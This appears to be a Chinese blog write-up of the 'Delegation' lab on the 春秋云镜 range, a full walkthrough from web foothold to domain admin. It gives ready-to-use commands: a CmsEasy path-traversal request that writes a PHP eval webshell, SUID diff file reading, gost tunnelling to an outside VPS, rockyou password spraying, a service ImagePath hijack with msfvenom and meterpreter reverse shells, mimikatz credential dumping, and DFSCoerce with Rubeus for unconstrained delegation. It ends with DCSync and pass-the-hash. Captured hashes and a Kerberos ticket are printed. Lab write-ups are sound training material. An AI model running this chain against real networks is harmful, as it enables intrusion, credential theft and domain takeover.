---
title: "春秋云镜 Delegation"
onlyTitle: true
date: 2025-12-18 02:17:42
categories:
- 渗透
- 春秋云镜
tags:
- 春秋云镜
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8181.png
---



## 春秋云镜 Delegation

39.98.115.7

### flag1

fscan一直爆破ftp，神人

百度一下，发现直接拼接admin得到后台

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251114142712105.png)

admin 123456登陆

看到版本是7.7.5

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251114143044960.png)



CmsEasy_7.7.5_20211012存在任意文件写入和任意文件读取漏洞POC：

https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%92%8C%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#%E5%AE%89%E8%A3%85%E5%8C%85%E4%B8%8B%E8%BD%BD

其实也就是ListSec上CmsEasy 7.3.8 本地文件包含漏洞的poc

http://1.116.103.114/hole/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/CmsEasy/003-CmsEasy%207.3.8%20%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/

```http
POST /index.php?case=template&act=save&admin_dir=admin&site=default HTTP/1.1
Host: 192.168.31.96
Content-Length: 57
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded;
Cookie: login_username=admin; login_password=a14cdfc627cef32c707a7988e70c1313;
Connection: close

sid=#data_d_.._d_.._d_.._d_1.php&slen=693&scontent=<?php eval($_REQUEST[1]);phpinfo();?>
```

`.._d_`  代表 ` ../`，此处用来路径穿越

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251114143756136.png)

shell是低权限的www用户

找一下suid命令

```sh
find / -perm -u=s -type f 2>/dev/null
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251114143946634.png)

找到一个特别的/usr/bin/diff

在[**GTFOBins**](https://www.bing.com/ck/a?!&&p=0efa3b3b73775dc9742da2fc11106acb8dbae3d7a4517ffbd4f65596031af113JmltdHM9MTc2Mjk5MjAwMA&ptn=3&ver=2&hsh=4&fclid=39c994c5-4502-6ab4-3d99-829a44646b45&u=a1aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8v&ntb=1)找一下diff提权，可以LFILE参数处读文件

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251114144124193.png)

```sh
diff --line-format=%L /dev/null /home/flag/flag01.txt
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251114144254545.png)

flag01: flag{8fb7cd20-39d3-4562-803b-0e18feaa2917}

flag1还有一个Hint：WIN19\Adrian 以及 rock you



### flag2

内网ip 172.22.4.36

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251114144422885.png)

上传fscan扫下内网，不过fscan直接在蚁剑扫一半都会输出过长（或是执行时间太长）而没有输出。（上个靶机也是）

转个shell到vshell

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251114145551909.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251114145810800.png)

```
172.22.4.45 WIN19 IISserver
172.22.4.7 win2016 DC01
172.22.4.19 win2016 FILESERVER
172.22.4.36 本机
```

先内网穿透出来

```
./gost -L socks5://:5555?bind=true

vi /etc/proxychains4.conf
socks5 39.98.115.7 5555
./gost -L rtcp://:2222/39.98.115.7:22 -F socks5://39.98.115.7:5555
```

对172.22.4.45爆破

```shell
proxychains4 crackmapexec smb 172.22.4.45 -u Adrian -p rockyou.txt -d WIN19
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251209205736840.png)

这里要跑很久，跑出来一个过期的账户密码Adrian:babygirl1

proxychains4 xfreerdp /v:172.22.4.45 /u:Adrian /p:babygirl1

xfreerdp好像登不上过期账户？只能

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251209205926191.png)

proxychains4 rdesktop 172.22.4.45

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251114163902248.png)

修改密码登陆后，桌面上有PrivescCheck扫描结果，打开html查看

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251114165344748.png)

当前用户对 gpupdate 服务的注册表项具有写权限，而且gupdate是以LocalSystem运行ImagePath的程序。那直接修改注册表中HKLM\SYSTEM\CurrentControlSet\Services\gupdate ImagePath选项为恶意shell，即可弹回高权限shell

```bash
Name              : gupdate
ImagePath         : "C:\Program Files (x86)\Google\Update\GoogleUpdate.exe" /svc
User              : LocalSystem
ModifiablePath    : HKLM\SYSTEM\CurrentControlSet\Services\gupdate
IdentityReference : BUILTIN\Users
Permissions       : WriteDAC, Notify, ReadControl, CreateLink, EnumerateSubKeys, WriteOwner, Delete, CreateSubKey, SetV
                    alue, QueryValue
Status            : Stopped
UserCanStart      : True
UserCanStop       : True
```

本地vshell生成一个shell.exe，然后本地也配好gost（额vshell的正向好像上不去，我看好像X1师傅用的Viper可以）

二刷用viper

Adrian/qwer1234

如果rdesktop不能上传shell，改好密码就在windows rdp上去

然后修改注册表

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251114170901868.png)



```bash
sc query gupdate
sc start gupdate
```

* 注册表提权（失败）

打注册表提权，先生成一个shell.exe，以管理员权限执行打开cmd执行a.bat

```
msfvenom -p windows/x64/exec cmd="C:\windows\system32\cmd.exe /c C:\Users\Adrian\Desktop\a.bat" --platform windows -f exe-service > shell.exe
```

a.bat如下，影响劫持提权

```a.bat
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"
```

然后修改ImagePath为shell.exe

* viper

但是这里打开的cmd依旧是低权限

这里本来想试下viper怎么配的，我真是sb啊，想通过本机内网穿透上线二层代理的马，搞了老半天，结果给linux上个马当跳板就行了

viper在vps上，先正常生成一个bash的马上线边界机，然后开个隧道就行了，但是我这里最外层都不能上线viper。。。

我领悟了，终于弹回来了！原来监听的地方需要生成虚拟监听而不是真实监听！生成elf上去运行即可（我是说远程是一直在卡死也就是弹回来，本地却收不到，原来是监听问题

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218171104289.png)

生成第二层监听

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218173712147.png)

然后点击生成虚拟监听，直接点生成PE/ELF，上传替换gupdate即可

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218173637962.png)

就能弹回，选不选x64都一样

但是不选迁移进程，过几十秒连接就断了

重新打了一遍迁移进程到svchost的shell，弹回来一秒钟甚至把一层shell都断了，逆天

然后重新生成一遍监听，居然之前的shell就弹回来了，道理我都懂，成功注入了svchost持续弹回shell，但是为什么第一次的shell不行？

不管了，反正自动迁移到svchost是对的，如果没收到就删了监听重新加一次

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218174709212.png)

啊啊啊，弹回来还是低权限的shell，麻了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218175014230.png)

注意到刚打进来是NT域用户权限，但是迁移之后执行命令却变成了低权限，说明不能迁移

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218175340428.png)

如果我们以极快的速度，不迁移进程，而是在shell弹回被之前在这个shell里再弹一遍shell，就能保持权限

ok马上操作

C:\Users\Adrian\Desktop\meterpreter_reverse_tcp_19981.exe

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218175840863.png)

可以看到真的成功了，之前的shell被杀掉了，这个还在运行

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218175902346.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218175939995.png)

说明迁移进程没屌用，虽然维持了权限，但是迁移后为低权限用户

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218180036605.png)

flag02: flag{74ff727b-184f-4106-8bb3-62d5b886ddd2}

### flag3&flag4

load kiwi加载一下mimikatz

creds_all为啥别人有东西我没东西？（我一定会给这个靶场0分

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218180909160.png)

hashdump一下，这里有本地administrator，前面不想打viper的就来这直接用hash pth上去，然后添加用户rdp算了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218181214321.png)

我也加吧，横向上去添加一波用户

```
python smbexec.py -hashes :ba21c629d9fd56aff10c3e826323e6ab administrator@172.22.4.45 -codec gbk
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218181432215.png)

手动上传mimikatz，然后抓密码（可恶的msf creds_all

由于是从内存抓，不是dcsync，所以用rdp的用户抓也是可以的，记得以管理员身份运行

mimikatz.exe "privilege::debug sekurlsa::logonpasswords full" exit

> 白银票据

抓到win19$的两个NTLM

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218182754178.png)

```
msv :
         [00000003] Primary
         * Username : WIN19$
         * Domain   : XIAORANG
         * NTLM     : 169d327f84a97c793d5a847429e88dc6
         * SHA1     : c32a717863fefbf9e376c33161890fc43cc8e5bf
          msv :
         [00000003] Primary
         * Username : WIN19$
         * Domain   : XIAORANG
         * NTLM     : 5943c35371c96f19bda7b8e67d041727
         * SHA1     : 5a4dc280e89974fdec8cf1b2b76399d26f39b8f8
```

依稀记得s1gg好像说过有两个hash是因为有个域策略要求每30天更新一次密码，然后更新之前的NTLM依旧保存在机器里

那找到最近一次Logon Time的NTLM，在我这里就是第一个

查找域委派关系

```sh
python findDelegation.py xiaorang.lab/WIN19$ -hashes :169d327f84a97c793d5a847429e88dc6 -dc-ip 172.22.4.7
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218183251469.png)

上图标识WIN19有unconstrained，也就是非约束委派

打dfscoerce，原理是需要我们强制域控访问这台主机，才能获取到相关信息，这里利用`DFSCoerce`强制DC访问域成员进而获取TGT

>https://blog.csdn.net/m0_75218183/article/details/131084165
>
>当 service1的服务账户开启了非约束委派后，user访问service1时, servicel会将user 的 TGT保存在内存中，然后service1就可以利用TGT以user的身份去访问域中的任何user可以访问的服务。
>如果域管理员访问了某个开启了非约束委派的服务，那么该服务所在计算机会将域管理员的TGT保存至内存，那么获得其特权便可以获取域控权限。
>
>这里的Rubeus和dfscoerce感觉就是类似Spooler让域控主动连接留存TGT吧

先上传Rubeus（管理员cmd

```
Rubeus.exe monitor /interval:1 /filteruser:DC01$
```

filteruser也就是只接收DC01访问，启动后会处于监听模式

```
python dfscoerce.py -u "WIN19$" -hashes :169d327f84a97c793d5a847429e88dc6 -d xiaorang.lab WIN19 172.22.4.7
```

得到ticket票据

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218184103405.png)

用rubeus把捕获的票据注入内存

```text
Rubeus.exe ptt /ticket:doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD4vvr0/G8N0PLiVcLLrDefOqFJRziMzVHeqLcG821HlcFFuXuvlii34PukRuN+5K06lILNE6dCaxWLHnVlmmLNyG3w0iIy3SMWaZVhGi9XuqTSGWNl+oOfJI+/zF6iXqlxdD/HQkWWZnaDUV2V+0NWX/ueenOvIASe+MSGhvUMEHIWvNqHVL9Ql4VU2emeoFov4t4Gmi2q8c+x66UA5Go9uP8RrxBQ3sQua/o2DKSNyxysBv9rrlLjzh79g6POHm44idwKfor9n65zqv+RXDSonCHs95bbpP7OeU7yaH98e34c0RUyO3jeyfrNTgymFV3mwyJ0ORt+3kzCKjiNVJmrCx5of4U4xGs1Ax7t+8ds0spBnIXDTkQkxbSM8nvj8tHCi6yN5UqczEdNQ7UHxDs9na4Ml6wFoYGbm49WTuK5or/Iy1cD7UJ++vWmZt6217+jmL8x3fQLyRCQ9yTO+03CmqC8m0Tqt+h4bOWBjIpGPIwuyibWxMxE4vSEJju9DM9ZKMfH0DW9ejHOIupdTC9ayXt8ZyOiuFYDWNnfiXAj6rSEjOvq0XMliEqZv5UUGNzf6ykfpZKkFHWAK9UlHKs8W5PA3AvRg1gYUaqlOnzMEBeMNrd9IS93oUm1NXDpvy4lm8lKt7yD97K+NZqIL5piYrMzV8nquCVHTjE6lPkERxWxtPoUeypVxc2HPJURSgzftxmSBkMUsK+TFWsfJIVyynovx/JfE9LejH1Sogdu7w7Uat/1uEYZcbvGnOuu9+WNyyBJEBy8k6Vx6jIM0HHDfQlGtkZXDXbSQFrwuc3SO4Y14o9urJ34LKbC0KZgfFpaVq1Q2aJ7G3Be/rX4Bt2xpMTM7DU7osIaxif6r3BPOcEhVwKHQfNaN7yvfsvznUHw84L3ThUPQ+n5stamOHSbXFAypVcdhGqtPBYGLt6Hz8uSDwXBKA4pW7N9vKwSjPd09J+1t6nFPjy2/N7hsyeePGI+zZ77KqG17DNUNGEs/7yrnTAGZc4haPO3IzrvSYdNv22TSxI1C0/wSdOY6gjay+98+jBElUXn70KFlGALqvv+Wc3/sg5i3r4upzZ6AINsLntpiiFLqqiGccyjBe4TDYOCFwysbzUaK6AxZ/mAwEY9xkBqIJJEkwF5NCRLVUl3Lj2eFU2kGQ7KiSiifwMS0l5lZY4ThXEAvfVptnqT4YnkIIsBIfbrtgZRQrYd1RKRg0Z3XNqlZh0GE6DYrAj6QU8vu7E2kohNdQLTK5IatJIo1mNpsxaJAYG3I/WhHbRalBeKHMYgc5O/9/QbVKy9dk0XKkNfWr6xNMjNN8MzX3HzjV8q1Wh8PoJhG5Tecm5nykUhNvbLearvmkwYHys3ZWnaUfkG1olFAKH1QXFGhPSdoUvpvu9nXEYKgDa+hOi7taAcvzMiNGixLkT2mp0eSARJ+nxutl9UK8CF34oOjgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCCJCEfXCQOXtBX4fIuE73NFwiK3x1lfnmSWT1qhxwFDoaEOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI1MTIxODA2NTAyM1qmERgPMjAyNTEyMTgxNjUwMjNapxEYDzIwMjUxMjI1MDY1MDIzWqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9SQU5HLkxBQg==
```

获取到了TGT，这个TGT也就是DC01$的机器账户

那我们的WIN19$也在域下，为什么不能打DCsync呢？因为WIN19$不是之前靶机的Administrators组

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218220326306.png)

只能用DC01$的TGT才能打Dcsync，用mimikatz导出域控的hash

```
mimikatz "lsadump::dcsync /all /csv"
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218184843013.png)

域控hash 4889f6553239ace1f7c47fa2c619c252

用域控hash pth到19和7主机拿到flag3和4

```sh
python smbexec.py -hashes :4889f6553239ace1f7c47fa2c619c252 xiaorang.lab/administrator@172.22.4.19 -codec gbk
type c:\Users\Administrator\flag\flag03.txt
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218185210443.png)

flag03: flag{3b0e7eb3-3523-43af-8b75-562e428ed358}

```
python smbexec.py -hashes :4889f6553239ace1f7c47fa2c619c252 xiaorang.lab/administrator@172.22.4.7 -codec gbk

type c:\Users\Administrator\flag\flag04.txt
```



flag04: flag{c8dd3d3c-f473-4761-8524-83d6667b8175}
